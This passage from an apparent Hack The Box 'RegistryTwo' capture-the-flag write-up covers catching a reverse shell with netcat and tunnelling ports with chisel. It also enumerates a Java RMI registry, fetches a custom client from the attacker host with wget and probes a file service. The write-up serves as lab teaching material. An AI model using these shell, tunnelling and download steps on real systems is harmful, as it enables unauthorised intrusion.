</code></pre></div><p>And the <code>curl</code> command will be executed:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 9999
Ncat: Version 7.94 ( https://nmap.org/ncat )  
Ncat: Listening on [::]:9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.1.132:65048.
GET /rce HTTP/1.1
Host: 192.168.1.132:9999
User-Agent: curl/7.57.0
Accept: */*
</code></pre></div><h2 id="foothold">Foothold</h2><p>Now, it&rsquo;s time to return to the machine. To get a reverse shell, we might want to encode the reverse shell command in <code>Runtime.exec</code> format (see <a target="_blank" href="https://ares-x.com/tools/runtime-exec/">this page</a>):</p><p><img alt="RegistryTwo 27" src="/images/HTB/RegistryTwo/RegistryTwo-27.webp"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.223:50780.
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4$ whoami
whoami
app
bash-4.4$ ip a
ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP qlen 1000
    link/ether 00:50:56:b9:a0:c1 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.223/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:a0c1/64 scope global dynamic
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:a0c1/64 scope link
       valid_lft forever preferred_lft forever
3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN
    link/ether 02:42:78:33:5b:fc brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-59a3a780b7b3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ae:c2:66:b5 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-59a3a780b7b3
       valid_lft forever preferred_lft forever
    inet6 fe80::42:aeff:fec2:66b5/64 scope link
       valid_lft forever preferred_lft forever
6: vethfc04326@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue master br-59a3a780b7b3 state UP  
    link/ether 3e:c4:0d:ef:f1:5a brd ff:ff:ff:ff:ff:ff
    inet6 fe80::3cc4:dff:feef:f15a/64 scope link
       valid_lft forever preferred_lft forever
8: veth74a0872@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue master br-59a3a780b7b3 state UP
    link/ether 9e:41:79:f1:fe:08 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::9c41:79ff:fef1:fe08/64 scope link
       valid_lft forever preferred_lft forever
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>We are inside a Docker container, and there are no useful commands to get a full TTY.</p><p>These are the open ports:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ netstat -nat
netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5001            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:3310            0.0.0.0:*               LISTEN
tcp        0     67 10.10.11.223:50780      10.10.17.44:4444        ESTABLISHED
tcp        0      1 10.10.11.223:56116      8.8.8.8:53              SYN_SENT
tcp        0      0 :::22                   :::*                    LISTEN
tcp        0      0 :::443                  :::*                    LISTEN
tcp        0      0 :::41149                :::*                    LISTEN
tcp        0      0 ::ffff:127.0.0.1:8005   :::*                    LISTEN
tcp        0      0 :::5000                 :::*                    LISTEN
tcp        0      0 :::8009                 :::*                    LISTEN
tcp        0      0 :::5001                 :::*                    LISTEN
tcp        0      0 :::9002                 :::*                    LISTEN
tcp        0      0 :::3306                 :::*                    LISTEN
tcp        0      0 :::3310                 :::*                    LISTEN
tcp        0      0 :::8080                 :::*                    LISTEN
tcp        0      0 ::ffff:10.10.11.223:50706 ::ffff:10.10.17.44:9002 CLOSE_WAIT  
tcp        0      0 ::ffff:127.0.0.1:44910  ::ffff:127.0.0.1:3306   ESTABLISHED
tcp        0      0 ::ffff:127.0.0.1:3306   ::ffff:127.0.0.1:44910  ESTABLISHED
tcp        0      0 ::ffff:127.0.0.1:3306   ::ffff:127.0.0.1:52566  TIME_WAIT
</code></pre></div><p>We could try accessing MySQL using port forwarding, but it is useless, there&rsquo;s nothing interesting in the database.</p><p>Another interesting port is 3310. We can use <a target="_blank" href="https://github.com/jpillora/chisel"><code>chisel</code></a> to forward the port:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server -p 1234 --reverse
2023/07/27 01:58:12 server: Reverse tunnelling enabled
2023/07/27 01:58:12 server: Fingerprint PMhZqwwnPDmxTpEYJlVO2Uoh2i17tNwX7IjunrBmyGo=  
2023/07/27 01:58:12 server: Listening on http://0.0.0.0:1234
2023/07/27 02:02:52 server: session#1: tun: proxy#R:3310=&gt;3310: Listening
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ /tmp/.chisel client 10.10.17.44:1234 R:3310:127.0.0.1:3310  
/tmp/.chisel client 10.10.17.44:1234 R:3310:127.0.0.1:3310
2023/07/27 00:02:41 client: Connecting to ws://10.10.17.44:1234
2023/07/27 00:02:42 client: Connected (Latency 107.543592ms)
</code></pre></div><p>Now, with <code>nmap</code> we can see that it is running ClamAV version 0.103.8, which seems to be secure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nmap</span> -sC -sV -sT 127.0.0.1 -p 3310
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 02:02 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00016s latency).

PORT     STATE SERVICE VERSION
3310/tcp open  clam    ClamAV 0.103.8 (26959) (AV definitions updated on:Tue Jul  4 07:29:23 2023)  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds
</code></pre></div><p>Notice that port 9002 is open, so we have access to the legitimate RMI server. We can forward the port again and use <code>rmg</code> to enumerate the RMI registry:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">java</span> -jar <span class="mtku">rmg-4.4.1-jar-with-dependencies.jar</span> enum 127.0.0.1 9002
[+] <span class="code-dark-blue">RMI registry bound names:</span>
[+]
[+]     - <span class="code-dark-yellow">QuarantineService</span>
[+]             --&gt; <span class="code-dark-blue">com.htb.hosting.rmi.quarantine.QuarantineService</span> <span class="code-dark-magenta">(unknown class)</span>
[+]                 Endpoint: <span class="code-dark-blue">registry.webhosting.htb:39311</span>  TLS: <span class="code-dark-red">no</span>  ObjID: <span class="code-dark-blue">[5ec136a4:189974e59cd:-7ffe, 7286554781873068889]</span>
[+]     - <span class="code-dark-yellow">FileService</span>
[+]             --&gt; <span class="code-dark-blue">com.htb.hosting.rmi.FileService</span> <span class="code-dark-magenta">(unknown class)</span>
[+]                 Endpoint: <span class="code-dark-blue">registry.webhosting.htb:39311</span>  TLS: <span class="code-dark-red">no</span>  ObjID: <span class="code-dark-blue">[5ec136a4:189974e59cd:-7fff, -2889004651920348113]</span>  
[+]
[+] <span class="code-dark-blue">RMI server codebase enumeration:</span>
[+]
[+]     - The remote server <span class="code-dark-yellow">does not</span> expose any codebases.
[+]
[+] <span class="code-dark-blue">RMI server String unmarshalling enumeration:</span>
[+]
[+]     - Server complained that <span class="code-dark-yellow">object cannot be casted to java.lang.String.</span>
[+]       --&gt; The type <span class="code-dark-blue">java.lang.String</span> is unmarshalled via <span class="code-dark-yellow">readString().</span>
[+]       Configuration Status: <span class="code-dark-green">Current Default</span>
[+]
[+] <span class="code-dark-blue">RMI server useCodebaseOnly enumeration:</span>
[+]
[+]     - RMI registry uses <span class="code-dark-yellow">readString()</span> for unmarshalling java.lang.String.
[+]       This prevents <span class="code-dark-blue">useCodebaseOnly</span> enumeration from remote.
[+]
[+] <span class="code-dark-blue">RMI registry localhost bypass enumeration (CVE-2019-2684):</span>
[+]
[+]     - Caught <span class="code-dark-yellow">NotBoundException</span> during unbind call <span class="code-dark-blue">(unbind was accepted).</span>
[+]       Vulnerability Status: <span class="code-dark-red">Vulnerable</span>
[+]
[+] <span class="code-dark-blue">RMI Security Manager enumeration:</span>
[+]
[+]     - Caught Exception containing <span class="code-dark-yellow">'no security manager'</span> during RMI call.
[+]       --&gt; The server <span class="code-dark-yellow">does not</span> use a Security Manager.
[+]       Configuration Status: <span class="code-dark-green">Current Default</span>
[+]
[+] <span class="code-dark-blue">RMI server JEP290 enumeration:</span>
[+]
[+]     - DGC <span class="code-dark-yellow">rejected</span> deserialization of<span class="code-dark-blue"> java.util.HashMap</span><span class="code-dark-yellow"> (JEP290 is installed).</span>
[+]       Vulnerability Status: <span class="code-dark-green">Non Vulnerable</span>
[+]
[+] <span class="code-dark-blue">RMI registry JEP290 bypass enumeration:</span>
[+]
[+]     - RMI registry uses <span class="code-dark-yellow">readString()</span> for unmarshalling java.lang.String.
[+]       This prevents <span class="code-dark-blue">JEP 290 bypass</span> enumeration from remote.
[+]
[+] <span class="code-dark-blue">RMI ActivationSystem enumeration:</span>
[+]
[+]     - Caught <span class="code-dark-yellow">NoSuchObjectException</span> during activate call <span class="code-dark-yellow">(activator not present).</span>
[+]       Configuration Status: <span class="code-dark-green">Current Default</span>
</code></pre></div><p>Actually, there are two: <code>FileService</code> and <code>QuarantineService</code>. For the moment, we only know about <code>FileService</code>, we&rsquo;ve got the function signatures. The idea now is to call these functions from the RMI registry.</p><p>There are some examples in the WAR file. Based on those, we can build this RMI client to interact with the RMI server:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">com</span><span class="mtk5">.</span><span class="mtk8 mtku">htb</span><span class="mtk5">.</span><span class="mtk8 mtku">hosting</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">AbstractFile</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">nio</span><span class="mtk5">.</span><span class="mtk8 mtku">charset</span><span class="mtk5">.</span><span class="mtk8 mtku">StandardCharsets</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">registry</span><span class="mtk5">.</span><span class="mtk8 mtku">LocateRegistry</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">rmi</span><span class="mtk5">.</span><span class="mtk8 mtku">registry</span><span class="mtk5">.</span><span class="mtk8 mtku">Registry</span><span class="mtk1">;</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">Arrays</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">Base64</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">java</span><span class="mtk5">.</span><span class="mtk8 mtku">util</span><span class="mtk5">.</span><span class="mtk8 mtku">List</span><span class="mtk1">;</span>


<span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Client</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk8 mtku">String</span><span class="mtk1">[] </span><span class="mtk9 mtki">args</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">String</span><span class="mtk1"> </span><span class="mtk1">cmd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">];</span>

<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk8 mtku">Registry</span><span class="mtk1"> </span><span class="mtk1">registry</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> LocateRegistry.</span><span class="mtk8">getRegistry</span><span class="mtk1">(</span><span class="mtk4">"127.0.0.1"</span><span class="mtk1">, </span><span class="mtk6">9002</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk8 mtku">FileService</span><span class="mtk1"> </span><span class="mtk1">stub</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">FileService</span><span class="mtk1">) </span><span class="mtk1">registry</span><span class="mtk1">.</span><span class="mtk8">lookup</span><span class="mtk1">(</span><span class="mtk4">"FileService"</span><span class="mtk1">);</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">cmd</span><span class="mtk1">.</span><span class="mtk8">equals</span><span class="mtk1">(</span><span class="mtk4">"list"</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk8 mtku">List</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">AbstractFile</span><span class="mtk1">&gt; </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stub</span><span class="mtk1">.</span><span class="mtk8">list</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]);</span>
<span class="mtk1">                </span><span class="mtk1">response</span><span class="mtk1">.</span><span class="mtk8">stream</span><span class="mtk1">().</span><span class="mtk8">map</span><span class="mtk1">(f </span><span class="mtk7 mtki">-&gt;</span><span class="mtk1"> f.</span><span class="mtk8">getDisplayName</span><span class="mtk1">()).</span><span class="mtk8">forEach</span><span class="mtk1">(System.out</span><span class="mtk5">::</span><span class="mtk1">println);</span>
<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">cmd</span><span class="mtk1">.</span><span class="mtk8">equals</span><span class="mtk1">(</span><span class="mtk4">"createDirectory"</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stub</span><span class="mtk1">.</span><span class="mtk8">createDirectory</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]);</span>
<span class="mtk1">                System.out.</span><span class="mtk8">println</span><span class="mtk1">(</span><span class="mtk1">response</span><span class="mtk1">);</span>
<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">cmd</span><span class="mtk1">.</span><span class="mtk8">equals</span><span class="mtk1">(</span><span class="mtk4">"view"</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">byte</span><span class="mtk1">[] </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stub</span><span class="mtk1">.</span><span class="mtk8">view</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]);</span>
<span class="mtk1">                System.out.</span><span class="mtk8">println</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">String</span><span class="mtk1">(</span><span class="mtk1">response</span><span class="mtk1">, StandardCharsets.UTF_8));</span>
<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">cmd</span><span class="mtk1">.</span><span class="mtk8">equals</span><span class="mtk1">(</span><span class="mtk4">"newDomain"</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stub</span><span class="mtk1">.</span><span class="mtk8">newDomain</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]);</span>
<span class="mtk1">                System.out.</span><span class="mtk8">println</span><span class="mtk1">(</span><span class="mtk1">response</span><span class="mtk1">);</span>
<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">cmd</span><span class="mtk1">.</span><span class="mtk8">equals</span><span class="mtk1">(</span><span class="mtk4">"uploadFile"</span><span class="mtk1">)) {</span>
<span class="mtk1">                </span><span class="mtk7 mtki">boolean</span><span class="mtk1"> </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stub</span><span class="mtk1">.</span><span class="mtk8">uploadFile</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">], Base64.</span><span class="mtk8">getDecoder</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">[</span><span class="mtk6">3</span><span class="mtk1">]));</span>  
<span class="mtk1">                System.out.</span><span class="mtk8">println</span><span class="mtk1">(</span><span class="mtk1">response</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">            System.err.</span><span class="mtk8">println</span><span class="mtk1">(</span><span class="mtk4">"Client exception: "</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">toString</span><span class="mtk1">());</span>
<span class="mtk1">            </span><span class="mtk1">e</span><span class="mtk1">.</span><span class="mtk8">printStackTrace</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Basically, I took the functions that were more interesting, added command-line arguments to call them and then print the result. We don&rsquo;t know the specific implementation, so we must try them all.</p><p>Just for sanity, let&rsquo;s check the Java version in the container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ java -version
java -version
openjdk version "1.8.0_151"
OpenJDK Runtime Environment (IcedTea 3.6.0) (Alpine 8.151.12-r0)  
OpenJDK 64-Bit Server VM (build 25.151-b12, mixed mode)
</code></pre></div><p>Hence, let&rsquo;s use a Docker container with this specific version of Java to compile the above class:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>:/home/rocky"</span> openjdk:8 bash
root@a3e3202d3b31:/# cd /home/rocky
root@a3e3202d3b31:/home/rocky# javac com/htb/hosting/rmi/Client.java  
root@a3e3202d3b31:/home/rocky# cp com/htb/hosting/rmi/Client.class .
</code></pre></div><p>Now we can upload the class file to the remote container and use it from there:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ cd /tmp
cd /tmp
bash-4.4$ wget -qO Client.class 10.10.17.44:8000/Client.class
wget -qO Client.class 10.10.17.44:8000/Client.class
bash-4.4$ mkdir -p com/htb/hosting/rmi
mkdir -p com/htb/hosting/rmi
bash-4.4$ mv Client.class com/htb/hosting/rmi
mv Client.class com/htb/hosting/rmi
bash-4.4$ cp /usr/local/tomcat/webapps/hosting/WEB-INF/classes/com/htb/hosting/rmi/*.class com/htb/hosting/rmi
&lt;ses/com/htb/hosting/rmi/*.class com/htb/hosting/rmi
bash-4.4$ java com.htb.hosting.rmi.Client newDomain asdf
java com.htb.hosting.rmi.Client newDomain asdf
true
bash-4.4$ java com.htb.hosting.rmi.Client view '' ''
java com.htb.hosting.rmi.Client view '' ''
Client exception: java.lang.IllegalArgumentException: Specified vhost not matching regex '[0-9a-fA-F]+':
java.lang.IllegalArgumentException: Specified vhost not matching regex '[0-9a-fA-F]+':
        at com.htb.hosting.rmi.FileServiceImpl.getFromDocumentRoot(FileServiceImpl.java:30)
        at com.htb.hosting.rmi.FileServiceImpl.view(FileServiceImpl.java:204)
        at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:566)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:359)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:562)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:796)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:677)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:676)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at java.lang.Thread.run(Thread.java:829)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:283)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:260)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)
        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:227)  
        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:179)
        at com.sun.proxy.$Proxy0.view(Unknown Source)
        at com.htb.hosting.rmi.Client.main(Client.java:30)
</code></pre></div><p>As can be seen, we are interacting with the RMI server. The <code>newDomain</code> function was successful, but in <code>view</code> we need to pass a RegEx:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ java com.htb.hosting.rmi.Client view 1337 ''
java com.htb.hosting.rmi.Client view 1337 ''

bash-4.4$ java com.htb.hosting.rmi.Client view asdf
java com.htb.hosting.rmi.Client view asdf
Client exception: java.lang.ArrayIndexOutOfBoundsException: 2  
java.lang.ArrayIndexOutOfBoundsException: 2
        at com.htb.hosting.rmi.Client.main(Client.java:30)
bash-4.4$ java com.htb.hosting.rmi.Client view /
java com.htb.hosting.rmi.Client view /
Client exception: java.lang.ArrayIndexOutOfBoundsException: 2
java.lang.ArrayIndexOutOfBoundsException: 2
        at com.htb.hosting.rmi.Client.main(Client.java:30)
bash-4.4$ java com.htb.hosting.rmi.Client view 1337 asdf
java com.htb.hosting.rmi.Client view 1337 asdf
</code></pre></div><p>After some tries, we can guess that the domain name must match the RegEx, so let&rsquo;s create a new one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-4.4$ java com.htb.hosting.rmi.Client newDomain 1337
java com.htb.hosting.rmi.Client newDomain 1337
true
bash-4.4$ java com.htb.hosting.rmi.Client view 1337 asdf
java com.htb.hosting.rmi.Client view 1337 asdf
Client exception: java.nio.file.NoSuchFileException: /sites/www.static-1337.webhosting.htb/asdf
java.nio.file.NoSuchFileException: /sites/www.static-1337.webhosting.htb/asdf
        at sun.nio.fs.UnixException.translateToIOException(UnixException.java:92)
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111)
        at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116)
        at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219)
        at java.nio.file.Files.newByteChannel(Files.java:371)
        at java.nio.file.Files.newByteChannel(Files.java:422)
        at java.nio.file.Files.readAllBytes(Files.java:3206)
        at com.htb.hosting.rmi.FileServiceImpl.view(FileServiceImpl.java:212)
        at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:566)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:359)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:562)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:796)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:677)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:676)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
        at java.lang.Thread.run(Thread.java:829)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:283)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:260)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)
        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:227)  
        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:179)
        at com.sun.proxy.$Proxy0.view(Unknown Source)
        at com.htb.hosting.rmi.Client.main(Client.java:30)
